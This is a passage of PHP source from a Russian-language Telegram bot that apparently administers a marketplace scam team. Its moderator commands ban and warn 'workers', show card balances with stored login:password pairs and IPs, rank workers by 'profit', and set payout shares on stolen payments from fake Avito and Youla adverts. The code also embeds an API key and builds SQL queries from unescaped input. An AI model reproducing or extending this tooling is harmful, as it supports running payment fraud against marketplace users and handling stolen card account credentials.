									send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = "⚠️ <b>У</b> <a href=\"tg://user?id=$user_id\">воркера</a> нет предупреждений</b>";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = "⚠️ <b>Воркер с таким ID не найден</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = "❔ Используйте /unwarn <code>[Telegram ID]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}



//====================== МОДЕРКА - выдать предупреждение ==========================//



					if(preg_match('/^\/warn/i', $message['text']) == TRUE) {
						if(preg_match('/^\/warn \d+$/i', $message['text']) == TRUE) {
							$user_id = mb_substr($message['text'], 6);


								$query = mysqli_query($connection, "SELECT `access`, `warns` FROM `accounts` WHERE `telegram` = '$user_id'");

								if(mysqli_num_rows($query) > 0) {
									$user = mysqli_fetch_assoc($query);

									if($user['access'] <= 0) {
										$text = "🚫 <a href=\"tg://user?id=$user_id\">Воркер</a> <b>уже заблокирован или неактивен</b>";
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									} elseif($user['warns'] < 3 AND $user['warns'] != 2) {
										mysqli_query($connection, "UPDATE `accounts` SET `warns` = `warns`+1 WHERE `telegram` = '$user_id'");
										$text = "⚠️ <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>выдал предупреждение</b> <a href=\"tg://user?id=$user_id\">воркеру</a> <code>[".($user['warns']+1)."/3]</code>";
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
										$text = "⚠️ <b>Модератор выдал вам предупреждение</b> <code>[".($user['warns']+1)."/3]</code>";
										send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									} elseif($user['warns'] >= 2) {
										mysqli_query($connection, "UPDATE `accounts` SET `access` = '-1', `warns` = `warns`+1, `card` = '0' WHERE `telegram` = '$user_id'");
										mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` > '1'");
										mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` > '1'");

										send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));
										send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));
										$text = "⚠️ <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>выдал предупреждение</b> <a href=\"tg://user?id=$user_id\">воркеру</a> <code>[".($user['warns']+1)."/3]</code>\n\n";
										$text .= "Воркер был заблокирован";
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
										$text = "⚠️ <b>Модератор выдал вам предупреждение</b> <code>[".($user['warns']+1)."/3]</code>\n\n";
										$text .= "Для вас доступ был заблокирован";
										send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									}
								} else {
									$text = "🚫 <b>Воркер с таким ID не найден</b>";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}

						} else {
							$text = "❔ Используйте /warn <code>[Telegram ID]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}



//====================== МОДЕРКА - выдать бан ==========================//



					if(preg_match('/^\/ban/i', $message['text']) == TRUE) {
						if(preg_match('/^\/ban \d+$/i', $message['text']) == TRUE) {
							$user_id = mb_substr($message['text'], 5);


								$query = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `telegram` = '$user_id'");

								if(mysqli_num_rows($query) > 0) {
									mysqli_query($connection, "UPDATE `accounts` SET `access` = '-1', `card` = '0' WHERE `telegram` = '$user_id'");
									mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");
									mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");

									send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));
									send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));

									$text = "🚫 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>заблокировал</b> <a href=\"tg://user?id=$user_id\">воркера</a>";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = "🚫 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>заблокировал</b> <a href=\"tg://user?id=$user_id\">воркера</a>";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = "🚫 <b>Модератор заблокировал вам доступ к проекту.</b>";
									send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									mysqli_query($connection, "INSERT INTO `accounts` (`username`, `telegram`, `access`, `stake`, `card`, `created`) VALUES ('username', '$user_id', '-1', '0', '0', '".time()."')");
									send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));
									send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));
									$text = "🚫 <b>Воркер с таким ID не найден, но был заблокирован</b>";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = "🚫 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>заблокировал</b> <a href=\"tg://user?id=$user_id\">пользователя</a> <b>с Telegram ID:</b> <code>$user_id</code>";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}

						} else {
							$text = "❔ Используйте /ban <code>Telegram ID воркера</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}



//====================== МОДЕРКА - снять бан ==========================//



					if(preg_match('/^\/unban/i', $message['text']) == TRUE) {
						if(preg_match('/^\/unban \d+$/i', $message['text']) == TRUE) {
							$user_id = mb_substr($message['text'], 7);

							$query = mysqli_query($connection, "SELECT `id`, `access` FROM `accounts` WHERE `telegram` = '$user_id'");

							if(mysqli_num_rows($query) > 0) {
								$user = mysqli_fetch_assoc($query);

								if($user['access'] <= 0) {
									mysqli_query($connection, "UPDATE `accounts` SET `access` = '0', `warns` = '0' WHERE `telegram` = '$user_id'");

									send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id));
									send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id));

									$text = "♻️ <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>разблокировал</b> <a href=\"tg://user?id=$user_id\">воркера</a>";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = "♻️ <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>разблокировал</b> <a href=\"tg://user?id=$user_id\">воркера</a>";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = "♻️ <b>Модератор разблокировал вам доступ к проекту.</b>\n\n";
									$text .= "Можете подать свою заявку в команду, /start";
									send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id));
									send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id));

									$text = "♻️ <b>Воркер не заблокирован, но был вынесен из черного списка в беседах</b>";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = "♻️ <b>Воркер с таким ID не найден</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = "❔ Используйте /unban <code>Telegram ID воркера</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}



//====================== МОДЕРКА - информация по карте ==========================//



					if(preg_match('/\/card (\d{16}|\d{4}\s\d{4}\s\d{4}\s\d{4}|0)/i', $message['text']) == TRUE) {
						$card = str_replace(' ', '', substr($message['text'], 6));

						$query = mysqli_query($connection, "SELECT `login`, `password`, `token`, `amount`, `totalAmount`, `number`, `status`, `ip` FROM `cards` WHERE `number` = '$card'");

						if(mysqli_num_rows($query) > 0) {
							$card = mysqli_fetch_assoc($query);


							if($card['amount'] < $amount) {
								$totalAmount = ($amount-$card['amount']);
								$card['totalAmount'] = $totalAmount;
							} else {
								$totalAmount = 0;
							}

							if($card['status'] == '0') $status = 'Неактивна';
							if($card['status'] == '1') $status = 'Активна';

							$workers = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` > '0' AND `card` = '$card[number]'"));

							$text = "💳 <b>Информация о карте:</b>\n\n";
							$text .= "Номер карты: <code>$card[number]</code>\n";
							$text .= "Данные для входа: <code>$card[login]:$card[password]</code>\n";
							$text .= "Баланс: <code>$amount руб.</code> | Принято: <code>$card[totalAmount] руб.</code>\n";
							$text .= "Статус: <code>$status</code>\n";
							$text .= "Используют: <code>".Endings($workers, "воркер", "воркера", "воркеров")."</code>\n";
							$text .= "Последний IP: <code>$card[ip]</code>\n";

							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$bin = substr($message['text'], 6, -10);
							$card = json_decode(curl_get_contents("https://api.cardinfo.online?input=$bin&apiKey=9f46488683ee53ae5b45215f7f566ffa"));

							if(isset($card->{'bankNameLocal'}) OR isset($card->{'country'}) OR isset($card->{'cardType'})) {
								$bankName = $card->{'bankNameLocal'};
								$country = $card->{'country'};
								$cardType = $card->{'brandName'};

								$text = "💳 <b>Информация о карте</b> <code>".substr($message['text'], 6)."</code><b></b>\n\n";
								if(isset($card->bankNameLocal)) $text .= "<b>Банк:</b> <code>$bankName</code>\n";
								if(isset($card->country)) $text .= "<b>Страна:</b> <code>$country</code>\n";
								if(isset($card->cardType)) $text .= "<b>Тип:</b> <code>$cardType</code>\n";

								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} elseif($bin == '489049' OR $bin == '469395') {
								$text = "💳 <b>Информация о карте</b> <code>".substr($message['text'], 6)."</code><b></b>\n\n";
								$text .= "<b>Банк:</b> <code>QIWI BANK</code>\n";
								$text .= "<b>Страна:</b> <code>RU</code>\n";
								$text .= "<b>Тип:</b> <code>Visa</code>\n";

								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} elseif($bin == '559900') {
								$text = "💳 <b>Информация о карте</b> <code>".substr($message['text'], 6)."</code><b></b>\n\n";
								$text .= "<b>Банк:</b> <code>YANDEX.MONEY</code>\n";
								$text .= "<b>Страна:</b> <code>RU</code>\n";
								$text .= "<b>Тип:</b> <code>Mastercard</code>\n";
							} else {
								$text = "🥺 <b>Информация о карте не найдена</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						}
					}



//====================== МОДЕРКА - настройки ==========================//



					if(preg_match('/\/settings/i', $message['text']) == TRUE) {
						if($settings['card'] == 0) $settings['card'] = 'Не установлена';

						$stake = explode(':', $settings['stake']);

						$avito = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(*) AS `count` FROM `free` WHERE `type` = '0'"));
						$youla = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(*) AS `count` FROM `free` WHERE `type` = '1'"));

						$text = "🔧 <b>Настройки</b>\n\n";
						$text .= "<b>Карта по умолчанию:</b> <code>$settings[card]</code>\n";
						$text .= "<b>Текущая ставка:</b> <code>оплата - $stake[0]% и возврат - $stake[1]%</code>\n";
						$text .= "<b>Минимальная сумма товара:</b> <code>$settings[min_price] руб.</code>\n";
						$text .= "<b>Максимальная сумма товара:</b> <code>$settings[max_price] руб.</code>\n";
						$text .= "<b>Сумма доставки:</b> <code>$settings[delivery] руб.</code>\n\n";
						$text .= "🎁 <b>Бесплатные аккаунты</b>\n";
						$text .= "<b>Авито:</b> <code>$avito[count] шт.</code> | <b>Юла:</b> <code>$youla[count] шт.</code>";

						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}


//====================== МОДЕРКА - статистика ==========================//



					if(preg_match('/\/stats/i', $message['text']) == TRUE) {
						$total['workers'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` > '0'"));
						$total['users'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` = '0'"));
						$total['banned'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` < '0'"));
						$total['withCard'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` > '0' AND `card` != '0'"));
						$total['withOutCard'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` > '0' AND `card` = '0'"));
						$total['today'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` > '0' AND DATE_FORMAT(FROM_UNIXTIME(`created`), '%d.%m.%Y') = '".date("d.m.Y")."'"));

						$payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `status` = '1'"));
						$mpayments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `status` = '1' AND DATE_FORMAT(FROM_UNIXTIME(`time`), '%m.%Y') = '".date("m.Y")."'"));
						$tpayemnts = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `today` FROM `payments` WHERE `status` = '1' AND DATE_FORMAT(FROM_UNIXTIME(`time`), '%d.%m.%Y') = '".date("d.m.Y")."'"));
						if(empty($tpayemnts['today'])) $tpayemnts['today'] = '0';

						$total['adverts'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `adverts`"));
						$total['activeAdverts'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `adverts` WHERE `status` = '1'"));
						$total['deletedAdverts'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `adverts` WHERE `status` = '-1'"));

						$text = "🐔 <b>Статистика проекта</b>\n\n";
						$text .= "<b>Активных:</b> <code>".Endings($total['workers'], "воркер", "воркера", "воркеров")."</code>\n";
						$text .= "<b>Неактивированных:</b> <code>".Endings($total['users'], "воркер", "воркера", "воркеров")."</code>\n";
						$text .= "<b>Заблокировано:</b> <code>".Endings($total['banned'], "воркер", "воркера", "воркеров")."</code>\n";
						$text .= "<b>С привязанной картой:</b> <code>".Endings($total['withCard'], "воркер", "воркера", "воркеров")."</code>\n";
						$text .= "<b>Без карты:</b> <code>".Endings($total['withOutCard'], "воркер", "воркера", "воркеров")."</code>\n";
						$text .= "<b>Сегодня одобрено:</b> <code>".Endings($total['today'], "воркер", "воркера", "воркеров")."</code>\n\n";
						$text .= "<b>Успешных оплат:</b> <code>$payments[count]</code>\n";
						$text .= "<b>Общий профит:</b> <code>$payments[total] руб.</code>\n\n";
						$text .= "<b>Оплат за месяц:</b> <code>$mpayments[count]</code>\n";
						$text .= "<b>Профит за месяц:</b> <code>$mpayments[total] руб.</code>\n\n";
						$text .= "<b>Оплат сегодня:</b> <code>$tpayemnts[count]</code>\n";
						$text .= "<b>Профит сегодня:</b> <code>$tpayemnts[today] руб.</code>\n\n";
						$text .= "<b>Сгенерировано:</b> <code>".Endings($total['adverts'], "объявление", "объявления", "объявлений")."</code>\n";
						$text .= "<b>Активных:</b> <code>".Endings($total['activeAdverts'], "объявление", "объявления", "объявлений")."</code>\n";
						$text .= "<b>Неактивных:</b> <code>".Endings($total['deletedAdverts'], "объявление", "объявления", "объявлений")."</code>\n";

						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}



//====================== МОДЕРКА - топ воркеров ==========================//



					if(preg_match('/\/top/i', $message['text']) == TRUE) {
						$payments = mysqli_query($connection, "SELECT `worker`, SUM(`amount`) AS `amount`, COUNT(`id`) AS `count` FROM `payments` WHERE `worker` != '0' AND `status` = '1' GROUP BY `worker` ORDER BY SUM(`amount`) DESC LIMIT 25");

						$x = 0;
						$text = "🔝 <b>Топ 25 воркеров:</b>\n\n";
						while($row = mysqli_fetch_assoc($payments)) {
							$x = $x+1;
							$user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `username`, `hidden` FROM `accounts` WHERE `telegram` = '$row[worker]'"));
							if($user['username'] == '' OR $user['username'] == 'username') $user['username'] = 'Без никнейма';
							if($user['hidden'] == TRUE) $user['username'] == 'Скрыт';
							$text .= "<b>$x. —</b> <a href=\"tg://user?id=$row[worker]\">$user[username]</a> — <code>$row[amount] RUB</code> — <code>". Endings($row['count'], "профит", "профита", "профитов") ."</code>\n";
						}

						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}


//====================== МОДЕРКА - добавить карту или изменить ==========================//



					if(preg_match('/^\/defaultcard/i', $message['text']) == TRUE) {
						if(preg_match('/^\/defaultcard (\d{16}|\d{4}\s\d{4}\s\d{4}\s\d{4})$/i', $message['text']) == TRUE) {
							$card = mb_substr($message['text'], 13);

							mysqli_query($connection, "UPDATE `config` SET `card` = '$card'");

							$text = "🃏 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил карту по умолчанию на</b> <code>".str_replace(' ', '', $card)."</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							$text = "🃏 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил карту по умолчанию на</b> <code>".str_replace(' ', '', $card)."</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}


//====================== МОДЕРКА - карат ==========================//



					if(preg_match('/^\/cards$/i', $message['text']) == TRUE) {
						$query = mysqli_query($connection, "SELECT `amount`, `totalAmount`, `status`, `verify`, `number` FROM `cards` WHERE `status` = '1' ORDER BY `totalAmount` DESC");

						if(mysqli_num_rows($query) > 0) {
							$i = 0;
							$text = "💳 <b>Информация о загруженных картах</b>\n\n";
							$pages = ceil(mysqli_num_rows($query)/10);

							while($row = mysqli_fetch_assoc($query)) {
								$i = $i+1;
								$users = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `card` = '$row[number]' AND `access` > '0'");
								if($row['verify'] == 1) $status = '✅';
								if($row['verify'] == 0) $status = '❌';
								if($settings['card'] == $row['number']) $row['number'] = "💎 $row[number]";
								$text .= $i.". — <code>$row[number]</code> | Статус: $status | Баланс: <code>$row[amount] руб.</code>\nПринято: <code>$row[totalAmount] руб.</code> | Используют: <code>".Endings(mysqli_num_rows($users), "воркер", "воркера", "воркеров")."</code>\n";
								#$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '⬅️ Назад', 'callback_data' => '/cards/'.$pages.'/'), Array('text' => 'Далее ➡️', 'callback_data' => '/cards/2/')))));
							}
						} else {
							$text = "💳 <b>Ни одна карта не загружена</b>";
						}

						if(empty($keyboard)) $keyboard = '';
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}



//====================== МОДЕРКА - добавить модера ==========================//



					if(preg_match('/^\/setmoder/i', $message['text']) == TRUE) {
						if(preg_match('/^\/setmoder (\d+|[a-zA-Z0-9@._]+)$/i', $message['text']) == TRUE) {

								$text = "📛 <b>У вас нет доступа к этой команде</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

						} else {
							$text = "❔ Используйте /setmoder <code>[Telegram ID] или [username]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}


//====================== МОДЕРКА - добавить саппорт ==========================//


					if(preg_match('/\/setsupport/i', $message['text']) == TRUE) {
						if(preg_match('/\/setsupport (\d+|[a-zA-Z0-9@._]+)/i', $message['text']) == TRUE) {

								$text = "📛 <b>У вас нет доступа к этой команде</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

						} else {
							$text = "❔ Используйте /setsupport <code>[Telegram ID] или [username]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}


//====================== МОДЕРКА - изменить текущую ставку ==========================//


					if(preg_match('/^\/stake/i', $message['text']) == TRUE) {
						if(preg_match('/^\/stake [0-9]{1,3};[0-9]{1,3}$/i', $message['text']) == TRUE) {
							$stake = explode(';', mb_substr($message['text'], 7));

							if($stake[0] <= 100 AND $stake[1] <= 100) {
								$curStake = explode(':', $settings['stake']);
								mysqli_query($connection, "UPDATE `config` SET `stake` = '$stake[0]:$stake[1]'");
								mysqli_query($connection, "UPDATE `accounts` SET `stake` = '$stake[0]:$stake[1]' WHERE `stake` = '$settings[stake]'");

								$text = "💯 <b>Модераторы изменили текущую ставку</b>\n\n";
								$text .= "Оплата — <b>$stake[0]%</b> и вовзрат <b>$stake[1]%</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['workers'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								$text = "💯 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил ставку с</b> <code>оплата - $curStake[0]% и вовзрат - $curStake[1]</code> <b>на</b> <code>оплата - $stake[0]% и вовзрат - $stake[1]</code>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "❗💯 Ставка не может быть больше 100%";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = "❔ Используйте /stake <code>[Оплата];[Возврат]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}


//====================== МОДЕРКА - добавить или изменить ставку ==========================//


					if(preg_match('/^\/setstake/i', $message['text']) == TRUE) {
						if(preg_match('/^\/setstake (\d+|@{0,1}[\w.]+);[0-9]{1,3};[0-9]{1,3}$/i', $message['text']) == TRUE) {
							$settings = explode(';', mb_substr($message['text'], 10));

							if(preg_match('/\d+/i', $settings[0]) == TRUE) {
								$search = $settings[0];
								$query = mysqli_query($connection, "SELECT `id`, `stake`, `telegram` FROM `accounts` WHERE `telegram` = '$search'");
							} elseif(preg_match('/(@{0,1}[\w.]+)/i', $settings[0]) == TRUE) {
								$search = str_replace('@', '', $settings[0]);
								$query = mysqli_query($connection, "SELECT `id`, `stake`, `telegram` FROM `accounts` WHERE `username` LIKE '%$search%'");
							}

							if(mysqli_num_rows($query) > 0) {
								$stake = "$settings[1]:$settings[2]";
								$stake = explode(':', $stake);

								if($stake[0] <= 100 AND $stake[1] <= 100) {
									$user = mysqli_fetch_assoc($query);
									mysqli_query($connection, "UPDATE `accounts` SET `stake` = '$stake[0]:$stake[1]' WHERE `telegram` = '$user[telegram]'");

									$curStake = explode(':', $user['stake']);

									$text = "🌀 <b>Модератор изменил вам ставку с</b> <code>оплата - $curStake[0]% и возврат - $curStake[1]%</code> <b>на</b> <code>оплата - $stake[0]% и возврат - $stake[1]%</code>";
									send($config['token'], 'sendMessage', Array('chat_id' => $user['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = "💵 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил ставку</b> <a href=\"tg://user?id=$settings[0]\">воркеру</a> <b>с</b> <code>оплата - $curStake[0]% и возврат - $curStake[1]%</code> <b>на</b> <code>оплата - $stake[0]% и возврат - $stake[1]%</code>";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = "💵 Ставка не может быть меньше <code>0%</code> и больше <code>100%</code>";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = "🌀 <b>Воркер с таким ID не найден</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = "❔ Используйте /setstake <code>[Telegram ID];[Оплата];[Возврат]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}


//====================== МОДЕРКА - добавить или изменить карту ==========================//


				// 	if(preg_match('/\/setcard/i', $message['text']) == TRUE) {
				// 		if(preg_match('/\/setcard \d+;(\d{16}|\d{4}\s\d{4}\s\d{4}\s\d{4}|0)/i', $message['text']) == TRUE) {
				// 			$settings = explode(';', mb_substr($message['text'], 9));
				// 			$settings[1] = str_replace(' ', '', $settings[1]);

				// 			$query = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `telegram` = '$settings[0]' AND `access` > '0'");

				// 			if(mysqli_num_rows($query) > 0) {
				// 				$cards = mysqli_query($connection, "SELECT `id` FROM `cards` WHERE `number` = '$settings[1]' AND `status` = '1'");
				// 				if($settings[1] == 0) {
				// 					mysqli_query($connection, "UPDATE `accounts` SET `card` = '0' WHERE `telegram` = '$settings[0]'");
				// 					$text = "🔑 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>удалил карту воркеру</b>\n\n";
